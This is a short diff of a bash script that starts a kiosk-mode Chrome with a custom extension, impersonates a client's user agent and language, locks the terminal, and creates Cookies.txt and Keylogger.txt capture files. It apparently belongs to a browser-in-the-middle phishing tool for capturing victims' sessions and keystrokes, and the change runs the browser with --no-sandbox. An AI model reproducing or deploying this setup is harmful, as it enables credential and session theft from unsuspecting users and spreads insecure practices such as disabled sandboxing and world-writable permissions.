@@ -35,7 +35,7 @@ sudo chmod a-rwx /usr/bin/xfce4-terminal && sudo mkdir Downloads 2> /dev/null
 sudo mkdir Downloads/Default 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
 sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address
 while read -rd $'' line; do export "$line" ; done < <(jq -r <<<"$values" 'to_entries|map("\(.key)=\"\(.value)\"\u0000")[]' /tmp/client_info.txt)
-unzip -n kiosk.zip && sleep 3 && /usr/bin/chromium --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start --user-agent="${USERAGENT//\"}" --accept-lang=${CLIENT_LANG//\"} &
+unzip -n kiosk.zip && sleep 3 && chrome-linux/chrome --no-sandbox --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start --user-agent="${USERAGENT//\"}" --accept-lang=${CLIENT_LANG//\"} &
 
 nohup /bin/bash -c "touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default" &
 nohup /bin/bash -c "touch /home/user/Downloads/Keylogger.txt" &
